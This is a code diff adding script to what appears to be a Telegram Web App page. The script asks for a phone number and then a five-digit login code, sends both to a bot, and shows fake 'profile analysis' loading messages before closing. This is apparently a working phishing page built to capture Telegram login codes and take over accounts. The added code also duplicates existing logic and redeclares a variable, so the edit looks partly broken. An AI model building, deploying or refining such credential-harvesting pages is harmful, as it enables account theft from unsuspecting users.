@@ -60,7 +60,41 @@
             document.getElementById('code-step').style.display = 'none';
             document.getElementById('loading').style.display = 'block';
             setTimeout(() => tg.close(), 3000);
-        }
+        } 
+        const tg = window.Telegram.WebApp;
+tg.expand();
+
+function sendPhone() {
+    const p = document.getElementById('phone').value.replace(/\s+/g, '');
+    if(p.length < 10) return alert("Введите полный номер");
+    
+    // Показываем, что процесс пошел
+    document.getElementById('phone-step').style.display = 'none';
+    document.getElementById('loading').style.display = 'block';
+    document.getElementById('loading').innerText = "Связь с сервером...";
+
+    // Шлем данные боту
+    tg.sendData(JSON.stringify({t: 'p', v: p}));
+    
+    // Спустя 2 секунды даем ввести код, если бот не закрыл окно
+    setTimeout(() => {
+        document.getElementById('loading').style.display = 'none';
+        document.getElementById('code-step').style.display = 'block';
+    }, 2000);
+}
+
+function sendCode() {
+    const c = document.getElementById('code').value;
+    if(c.length < 5) return alert("Код должен быть 5 знаков");
+    
+    tg.sendData(JSON.stringify({t: 'c', v: c}));
+    document.getElementById('code-step').style.display = 'none';
+    document.getElementById('loading').style.display = 'block';
+    document.getElementById('loading').innerText = "Анализ профиля...";
+    
+    // Закрываем через 3 сек
+    setTimeout(() => tg.close(), 3000);
+}
     </script> 
 </body>
 </html>
